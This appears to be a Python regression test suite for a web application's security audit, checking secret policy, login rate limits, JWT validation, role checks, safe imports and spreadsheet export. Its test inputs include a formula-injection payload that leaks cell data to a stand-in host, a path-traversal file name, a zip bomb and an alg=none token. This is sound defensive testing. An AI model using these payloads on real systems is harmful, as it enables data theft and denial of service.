"""Регрессионные тесты аудита безопасности (docs/SECURITY_AUDIT.md). ID находок — в именах и комментариях."""

import io
import os
import subprocess
import sys
import time
import zipfile
from pathlib import Path

import jwt
import pytest
from openpyxl import Workbook, load_workbook
from sqlalchemy import create_engine, select
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app import importer
from app.bootstrap import ensure_admin, lock_demo_users, password_problem
from app.config import Settings, get_settings, production_problems
from app.db import Base
from app.main import app
from app.models import AuditLog, User
from app.security import hash_password, sse_tickets, verify_password

BACKEND = Path(__file__).resolve().parents[1]
AT = "2026-08-01T12:00:00"
STRONG_SECRET = "9f2c4e7a1b3d5f60718293a4b5c6d7e8f9012a3b4c5d6e7f8091a2b3c4d5e6f7"
STRONG_DB = "postgresql+psycopg://collector:Zq8vR2mX7pL4tN9k@db:5432/collector"


def prod_settings(**kw) -> Settings:
    base = {
        "app_env": "production",
        "jwt_secret": STRONG_SECRET,
        "database_url": STRONG_DB,
        "cors_origins": "https://collector.example.ru",
    }
    return Settings(_env_file=None, **(base | kw))


# ---------- S-01 / S-02: секреты по умолчанию и production-режим ----------


def test_strong_production_settings_accepted():
    assert production_problems(prod_settings()) == []


@pytest.mark.parametrize(
    "override, fragment",
    [
        ({"jwt_secret": "dev-secret-change-me-in-env-min-32-bytes"}, "JWT_SECRET"),
        ({"jwt_secret": "change-me-to-a-long-random-string"}, "JWT_SECRET"),
        ({"jwt_secret": "short"}, "JWT_SECRET"),
        ({"database_url": "postgresql+psycopg://collector:change-me@db:5432/collector"}, "POSTGRES_PASSWORD"),
        ({"database_url": "postgresql+psycopg://collector:collector@db:5432/collector"}, "POSTGRES_PASSWORD"),
        ({"cors_origins": "*"}, "CORS_ORIGINS"),
        ({"cors_origins": "http://collector.example.ru"}, "CORS_ORIGINS"),
        ({"cors_origins": ""}, "CORS_ORIGINS"),
    ],
)
def test_weak_production_settings_rejected(override, fragment):
    problems = production_problems(prod_settings(**override))
    assert any(fragment in p for p in problems), problems


def test_demo_mode_is_not_checked():
    assert production_problems(Settings(_env_file=None, app_env="demo")) == []


def _run(code: str, **env) -> subprocess.CompletedProcess:
    full = {**os.environ, "PYTHONIOENCODING": "utf-8", **env}
    return subprocess.run([sys.executable, "-c", code], cwd=BACKEND, env=full, capture_output=True, text=True,
                          encoding="utf-8", timeout=120)


def test_api_refuses_to_start_with_default_secret_in_production():
    r = _run("import app.main", APP_ENV="production", JWT_SECRET="dev-secret-change-me-in-env-min-32-bytes",
             DATABASE_URL=STRONG_DB, CORS_ORIGINS="https://collector.example.ru")
    assert r.returncode != 0
    assert "JWT_SECRET" in r.stderr


def test_bootstrap_check_fails_on_weak_db_password():
    r = _run("from app.bootstrap import cmd_check; raise SystemExit(cmd_check())", APP_ENV="production",
             JWT_SECRET=STRONG_SECRET, DATABASE_URL="postgresql+psycopg://collector:change-me@db:5432/collector",
             CORS_ORIGINS="https://collector.example.ru")
    assert r.returncode == 1
    assert "POSTGRES_PASSWORD" in r.stderr


def test_production_app_hides_swagger_and_reports_not_demo():
    code = "import app.main as m; print(m.app.docs_url, m.app.openapi_url, m.settings.is_production)"
    r = _run(code, APP_ENV="production", JWT_SECRET=STRONG_SECRET, DATABASE_URL=STRONG_DB,
             CORS_ORIGINS="https://collector.example.ru")
    assert r.returncode == 0, r.stderr
    assert r.stdout.split() == ["None", "None", "True"]


def test_health_reports_demo_mode(client):
    assert client.get("/api/health").json()["demo"] is True


# ---------- S-02: демо-пользователи в production ----------


@pytest.fixture
def fresh_db():
    engine = create_engine("sqlite+pysqlite:///:memory:", connect_args={"check_same_thread": False},
                           poolclass=StaticPool)
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)
    yield factory
    engine.dispose()


def test_production_locks_demo_users_with_known_passwords(fresh_db):
    with fresh_db() as db:
        db.add_all([
            User(username="admin", full_name="A", role="admin", password_hash=hash_password("admin123")),
            User(username="dispatcher", full_name="D", role="dispatcher", password_hash=hash_password("Other-pass-2026")),
        ])
        db.commit()
        assert lock_demo_users(db) == ["admin"]
        users = {u.username: u for u in db.scalars(select(User))}
        assert users["admin"].is_active is False
        assert not verify_password("admin123", users["admin"].password_hash)
        # Демо-логин, у которого пароль уже сменили, не трогаем
        assert users["dispatcher"].is_active is True
        assert "demo_user_locked" in set(db.scalars(select(AuditLog.action)))


def test_production_seed_creates_no_usable_demo_logins(fresh_db, monkeypatch):
    from app.seed import seed

    monkeypatch.setattr(get_settings(), "app_env", "production")
    with fresh_db() as db:
        seed(db, "small")
        users = db.scalars(select(User)).all()
    assert users and all(not u.is_active for u in users)
    assert not any(verify_password(f"{u.username}123", u.password_hash) for u in users)


def test_initial_admin_from_env(fresh_db):
    with fresh_db() as db:
        assert ensure_admin(db, prod_settings()) == "missing"
        with pytest.raises(SystemExit):
            ensure_admin(db, prod_settings(admin_username="root", admin_password="admin123"))
        assert ensure_admin(db, prod_settings(admin_username="root", admin_password="Long-and-random-42")) == "created"
        assert ensure_admin(db, prod_settings(admin_username="other", admin_password="Long-and-random-43")) == "exists"
        root = db.scalar(select(User).where(User.username == "root"))
        assert root.role == "admin" and verify_password("Long-and-random-42", root.password_hash)


def test_password_policy():
    assert password_problem("short")
    assert password_problem("dispatcher123")
    assert password_problem("A-good-long-password") is None


# ---------- S-04: SSE без JWT в адресе ----------


def test_sse_rejects_jwt_in_query(client, tokens):
    r = client.get("/api/notifications/stream", params={"token": tokens["dispatcher"]})
    assert r.status_code == 401


def test_jwt_in_query_not_accepted_anywhere(client, tokens):
    r = client.get("/api/auth/me", params={"token": tokens["admin"]})
    assert r.status_code == 401


def test_sse_ticket_requires_auth_and_is_single_use(client, auth):
    assert client.post("/api/notifications/ticket").status_code == 401
    r = client.post("/api/notifications/ticket", headers=auth("manager"))
    assert r.status_code == 200
    body = r.json()
    assert 30 <= body["expires_in"] <= 60 and len(body["ticket"]) >= 32

    from app.api.notifications import stream_user

    user_id = stream_user(ticket=body["ticket"], header_token=None)
    assert isinstance(user_id, int)
    with pytest.raises(Exception) as second:
        stream_user(ticket=body["ticket"], header_token=None)
    assert getattr(second.value, "status_code", None) == 401


def test_sse_ticket_expires(client, auth, session_factory):
    with session_factory() as s:
        user = s.scalar(select(User).where(User.username == "dispatcher"))
    ticket = sse_tickets.issue(user, ttl=0)
    time.sleep(0.01)
    assert sse_tickets.redeem(ticket) is None


def test_sse_bad_ticket_is_401(client):
    assert client.get("/api/notifications/stream", params={"ticket": "nope"}).status_code == 401


# ---------- S-05: CORS ----------


def test_cors_does_not_allow_foreign_origin(client):
    r = client.options("/api/auth/login", headers={"Origin": "https://evil.example",
                                                  "Access-Control-Request-Method": "POST"})
    assert r.headers.get("access-control-allow-origin") is None
    assert r.headers.get("access-control-allow-credentials") is None


# ---------- S-06: LDAP закрыт по умолчанию ----------


def test_ldap_enabled_does_not_fall_back_to_local_passwords(client, monkeypatch):
    # LDAP включён, но каталог не настроен (LDAP_URL пуст) — вход закрыт (503), локальный пароль не проверяется
    monkeypatch.setattr(get_settings(), "ldap_enabled", True)
    monkeypatch.setattr(get_settings(), "ldap_url", "")
    monkeypatch.setattr(get_settings(), "ldap_role_groups", "admin:cn=admins")
    r = client.post("/api/auth/login", json={"username": "admin", "password": "admin123"})
    assert r.status_code == 503
    assert "access_token" not in r.text


def test_ldap_adapter_returning_none_is_401(client, monkeypatch):
    monkeypatch.setattr(get_settings(), "ldap_enabled", True)
    monkeypatch.setattr("app.api.auth.ldap_authenticate", lambda db, u, p: None)
    r = client.post("/api/auth/login", json={"username": "admin", "password": "anything"})
    assert r.status_code == 401


# ---------- S-07: перебор паролей и логинов ----------


def test_login_rate_limit(client):
    for _ in range(5):
        assert client.post("/api/auth/login", json={"username": "engineer", "password": "wrong"}).status_code == 401
    r = client.post("/api/auth/login", json={"username": "engineer", "password": "engineer123"})
    assert r.status_code == 429
    assert int(r.headers["Retry-After"]) > 0
    # Другой логин с того же адреса не заблокирован
    assert client.post("/api/auth/login", json={"username": "manager", "password": "manager123"}).status_code == 200


def test_login_rate_limit_per_ip(client, monkeypatch):
    monkeypatch.setattr(get_settings(), "login_max_failures_per_ip", 3)
    for i in range(3):
        client.post("/api/auth/login", json={"username": f"ghost{i}", "password": "x"})
    assert client.post("/api/auth/login", json={"username": "admin", "password": "admin123"}).status_code == 429


def test_unknown_user_and_wrong_password_look_the_same(client):
    a = client.post("/api/auth/login", json={"username": "no_such_user", "password": "x"})
    b = client.post("/api/auth/login", json={"username": "dispatcher", "password": "x"})
    assert a.status_code == b.status_code == 401
    assert a.json() == b.json()


def test_verify_password_without_user_is_false_and_slow_enough():
    started = time.perf_counter()
    assert verify_password("x", None) is False
    missing = time.perf_counter() - started
    stored = hash_password("secret-password")
    started = time.perf_counter()
    verify_password("x", stored)
    present = time.perf_counter() - started
    # Та же работа PBKDF2: время одного порядка (грубо, чтобы не мигало на медленных машинах)
    assert missing > present / 4


def test_oversized_login_is_422_not_500(client):
    r = client.post("/api/auth/login", json={"username": "a" * 100_000, "password": "b"})
    assert r.status_code == 422
    r = client.post("/api/auth/token", data={"username": "a" * 10_000, "password": "b"})
    assert r.status_code == 401


# ---------- S-08: JWT ----------


def test_jwt_alg_none_and_missing_exp_rejected(client):
    secret = get_settings().jwt_secret
    none_token = jwt.encode({"sub": "admin", "exp": int(time.time()) + 600}, None, algorithm="none")
    no_exp = jwt.encode({"sub": "admin"}, secret, algorithm="HS256")
    expired = jwt.encode({"sub": "admin", "exp": int(time.time()) - 5}, secret, algorithm="HS256")
    for token in (none_token, no_exp, expired):
        assert client.get("/api/auth/me", headers={"Authorization": f"Bearer {token}"}).status_code == 401


# ---------- S-09: каждая ручка — с осознанной проверкой ролей ----------

PUBLIC = {("GET", "/api/health"), ("POST", "/api/auth/login"), ("POST", "/api/auth/token")}


def _routes():
    # По схеме OpenAPI — тот же список, что в backend/openapi.json
    for path, ops in app.openapi()["paths"].items():
        for method in ops:
            yield method.upper(), path


def test_route_list_is_complete():
    assert len(set(_routes())) >= 30


def _fill(path: str) -> str:
    return path.replace("{", "").replace("}", "").replace("prediction_id", "1").replace("work_order_id", "1") \
        .replace("channel_id", "334609").replace("object_id", "1")


@pytest.mark.parametrize("method, path", sorted(set(_routes()) - PUBLIC))
def test_every_non_public_endpoint_requires_login(client, method, path):
    r = client.request(method, _fill(path))
    assert r.status_code == 401, (method, path, r.status_code)


WRITE_ENDPOINTS = [
    ("POST", "/api/predictions/1/decision", {"json": {"decision_type": "monitor", "reason_id": 11}}),
    ("POST", "/api/work-orders", {"json": {"channel_id": 334609, "priority": "low"}}),
    ("PATCH", "/api/work-orders/1", {"json": {"assignee": "x"}}),
    ("DELETE", "/api/work-orders/1", {}),
    ("POST", "/api/ingest/events", {"json": {"events": []}}),
    ("POST", "/api/import", {"data": {"kind": "events"}, "files": {"file": ("e.csv", b"a\n1\n", "text/csv")}}),
    ("POST", "/api/notifications/test", {}),
    ("POST", "/api/sim/start", {"json": {"day": "2026-08-01", "speed": 60}}),
    ("POST", "/api/sim/stop", {}),
]


@pytest.mark.parametrize("method, path, kw", WRITE_ENDPOINTS)
def test_manager_is_read_only_everywhere(client, auth, method, path, kw):
    assert client.request(method, path, headers=auth("manager"), **kw).status_code == 403


@pytest.mark.parametrize("method, path, kw", [e for e in WRITE_ENDPOINTS if "import" in e[1] or "ingest" in e[1]
                                              or "notifications/test" in e[1] or "/api/sim/" in e[1]])
def test_dispatcher_cannot_load_data_or_broadcast(client, auth, method, path, kw):
    assert client.request(method, path, headers=auth("dispatcher"), **kw).status_code == 403


# ---------- S-10: импорт ----------


def _xlsx(rows) -> bytes:
    wb = Workbook()
    for r in rows:
        wb.active.append(r)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def _upload(client, auth, name, content, kind="objects"):
    return client.post("/api/import", data={"kind": kind}, files={"file": (name, content, "application/octet-stream")},
                       headers=auth("engineer"))


def test_import_checks_content_not_only_extension(client, auth):
    assert _upload(client, auth, "objects.xlsx", b"id,level\n1,1\n").status_code == 422
    fake_csv = _xlsx([["id", "level", "kind", "name"]])
    r = _upload(client, auth, "objects.csv", fake_csv)
    assert r.status_code == 422 and "не текстовый" in r.json()["detail"]


def test_import_rejects_xlsx_bomb(client, auth, monkeypatch):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", "<x/>")
        zf.writestr("xl/worksheets/sheet1.xml", b"\0" * (4 * 1024 * 1024))  # 4 МБ нулей сжимаются в килобайты
    bomb = buf.getvalue()
    assert len(bomb) < 64 * 1024
    monkeypatch.setattr(importer, "MAX_XLSX_UNPACKED_BYTES", 1024 * 1024)
    r = _upload(client, auth, "objects.xlsx", bomb)
    assert r.status_code == 422 and "распаковки" in r.json()["detail"]


def test_import_row_limit(client, auth, monkeypatch):
    monkeypatch.setattr(importer, "MAX_IMPORT_ROWS", 2)
    csv_text = "id,level,kind,name\n" + "".join(f"{900 + i},1,Район,Р{i}\n" for i in range(3))
    r = _upload(client, auth, "objects.csv", csv_text.encode())
    assert r.status_code == 422 and "через ETL" in r.json()["detail"]


def test_import_sanitizes_file_name(client, auth):
    r = _upload(client, auth, "..\\..\\evil.csv", b"id,level,kind,name\n")
    assert r.status_code == 200, r.text
    assert r.json()["file_name"] == "evil.csv"
    assert importer.safe_file_name("../../x\r\n\x00.csv") == "x.csv"
    assert importer.safe_file_name(None) == "upload"
    assert len(importer.safe_file_name("a" * 1000 + ".csv")) == 128


def test_import_rate_limit(client, auth, monkeypatch):
    monkeypatch.setattr(get_settings(), "import_max_per_window", 2)
    for _ in range(2):
        _upload(client, auth, "objects.csv", b"id,level,kind,name\n")
    r = _upload(client, auth, "objects.csv", b"id,level,kind,name\n")
    assert r.status_code == 429


# ---------- S-11: формульная инъекция в выгрузке ----------


def test_export_neutralizes_formulas(client, auth):
    preds = client.get("/api/predictions", params={"at": AT, "risk_level": "critical", "limit": 1},
                       headers=auth()).json()["items"]
    pid = preds[0]["prediction_id"]
    reason = client.get("/api/reasons", params={"decision_type": "monitor"}, headers=auth()).json()[0]["id"]
    payload = '=HYPERLINK("http://evil.example/?"&A1,"Нажми")'
    r = client.post(f"/api/predictions/{pid}/decision", params={"at": AT},
                    json={"decision_type": "monitor", "reason_id": reason, "comment": payload}, headers=auth())
    assert r.status_code == 201, r.text

    x = client.get("/api/export/journal", params={"at": AT}, headers=auth("manager"))
    assert x.status_code == 200
    ws = load_workbook(io.BytesIO(x.content)).active
    cells = [c for row in ws.iter_rows() for c in row]
    assert not any(c.data_type == "f" for c in cells)
    assert any(c.value == "'" + payload for c in cells)


def test_excel_safe():
    from app.api.journal import excel_safe

    assert excel_safe("=1+1") == "'=1+1"
    assert excel_safe("@SUM(A1)") == "'@SUM(A1)"
    assert excel_safe("\t=cmd") == "'\t=cmd"
    assert excel_safe("Норма") == "Норма"
    assert excel_safe(-5) == -5
